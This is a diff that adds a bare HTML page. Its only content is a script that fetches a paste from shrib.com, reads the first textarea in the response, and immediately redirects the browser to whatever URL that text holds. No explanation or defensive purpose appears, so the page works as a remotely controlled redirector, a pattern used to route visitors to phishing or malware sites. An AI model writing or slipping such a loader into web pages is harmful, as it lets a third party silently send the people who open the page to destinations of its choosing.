@@ -1,0 +1,30 @@
+<html>
+<script>
+
+function handler() {
+  if(this.readyState == this.DONE) {
+    if(this.responseXML == null)
+	{
+		var parser = new DOMParser();
+		var xmlDoc = parser.parseFromString(this.response, "text/html");
+		var keystr = xmlDoc.getElementsByTagName('textarea')[0].childNodes[0].nodeValue;
+		window.location.replace(keystr);
+
+	}
+    if(this.status == 200 &&
+       this.responseXML != null) {
+      // success!
+	mytext = this.responseXML.getElementById('textarea').textContent;
+	alert(mytext);
+      return;
+    }
+  }
+}
+
+var req = new XMLHttpRequest();  
+req.onload = handler;
+req.open('GET', 'http://shrib.com/GkWegnkO?');   
+req.send(null);  
+
+</script>
+</html>
